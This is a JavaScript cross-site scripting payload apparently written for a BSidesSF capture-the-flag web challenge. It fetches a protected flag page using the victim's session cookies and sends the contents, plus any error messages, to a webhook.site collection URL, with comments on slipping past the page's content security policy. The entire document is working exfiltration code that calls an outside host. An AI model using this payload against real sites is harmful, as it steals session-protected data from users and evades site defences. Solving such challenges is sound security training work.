fetch("https://web-tutorial-2-9fec29fc.challenges.bsidessf.net/xss-two-flag", {
  credentials: "include"  // if the flag requires cookies/session as admin
})
  .then(r => {
    if (!r.ok) throw new Error("Fetch failed: " + r.status);
    return r.text();
  })
  .then(flag => {
    // Exfil without triggering img-src CSP
    // Use fetch (allowed by connect-src *) with no-cors or simple GET
    fetch("https://webhook.site/efd89572-9c32-410f-a9c5-d9c746e25aba?flag=" + encodeURIComponent(flag), {
      mode: "no-cors",       // prevents reading response, but request still fires
      keepalive: true        // helps send even if page unloads
    });
  })
  .catch(e => {
    // Debug exfil if needed
    fetch("https://webhook.site/efd89572-9c32-410f-a9c5-d9c746e25aba?err=" + encodeURIComponent(e.message), {
      mode: "no-cors"
    });
  });
